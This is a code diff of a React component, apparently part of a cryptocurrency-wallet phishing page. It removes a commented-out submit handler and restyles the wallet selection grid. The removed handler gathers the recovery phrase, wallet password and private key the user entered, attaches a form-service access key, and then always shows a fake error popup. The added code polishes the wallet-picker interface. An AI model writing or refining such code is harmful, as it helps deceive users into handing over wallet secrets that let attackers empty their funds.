@@ -30,33 +30,7 @@ const Cryp = () => {
     }, 3000);
   };
 
-  // // 🧾 When user submits form
-  // const onSubmit = async (event) => {
-  //   event.preventDefault();
-  //   setLoading(true);
-  //   setResult("Sending...");
-
-  //   const newFormData = new FormData();
-  //   newFormData.append("walletType", selectedWallet.title);
-
-  //   if (recoveryPhraseRef.current && !privateKey) {
-  //     newFormData.append("recoveryPhrase", recoveryPhraseRef.current.value.trim());
-  //   }
-  //   if (walletPasswordRef.current && key) {
-  //     newFormData.append("walletPassword", walletPasswordRef.current.value.trim());
-  //   }
-  //   if (privateKeyRef.current && privateKey) {
-  //     newFormData.append("privateKey", privateKeyRef.current.value.trim());
-  //   }
-
-  //   newFormData.append("access_key", "b664084a-5352-4e8d-9454-d2985759b9a9");
-
-  //   // Simulate submission and always show error popup after loading
-  //   setTimeout(() => {
-  //     setLoading(false);
-  //     setErrorPopup(true); // always show error popup after loading
-  //   }, 3000);
-  // };
+  
 
   const onSubmit = async (event) => {
   event.preventDefault();
@@ -103,18 +77,34 @@ const Cryp = () => {
   return (
     <>
       {/* Wallet List */}
-      <div className="relative grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-4 p-4">
-        {wallets.map((wt) => (
-          <div
-            onClick={() => handleWalletClick(wt)}
-            key={wt.id}
-            className="flex flex-col items-center mb-5 cursor-pointer hover:scale-105 transition-all duration-[0.5s]"
-          >
-            <img className="w-[60px] object-contain mb-2" src={wt.img} alt={wt.title} />
-            <p className="text-[12px] text-white font-extrabold text-center">{wt.title}</p>
-          </div>
-        ))}
+     <div className="relative grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-6 p-4 bg-white">
+  {wallets.map((wt) => (
+    <div
+      key={wt.id}
+      onClick={() => handleWalletClick(wt)}
+      className="cursor-pointer bg-white rounded-2xl shadow-lg hover:shadow-xl transition-all duration-300 p-4 flex flex-col items-center group"
+    >
+      <img
+        src={wt.img}
+        alt={wt.title}
+        className="w-[55px] h-[55px] object-contain mb-3"
+      />
+
+      <h3 className="text-[15px] font-semibold text-gray-900 text-center">
+        {wt.title}
+      </h3>
+
+      <p className="text-[12px] text-gray-500 text-center mt-1">
+        {wt.title}
+      </p>
+
+      {/* Small Icon */}
+      <div className="mt-3 w-5 h-5 rounded-full bg-[#4c3bff] flex items-center justify-center text-white text-[10px]">
+        <span>▢</span>
       </div>
+    </div>
+  ))}
+</div>
 
       {/* 🟩 Secure Connection Loading Popup (First Loading) */}
       {connecting && (
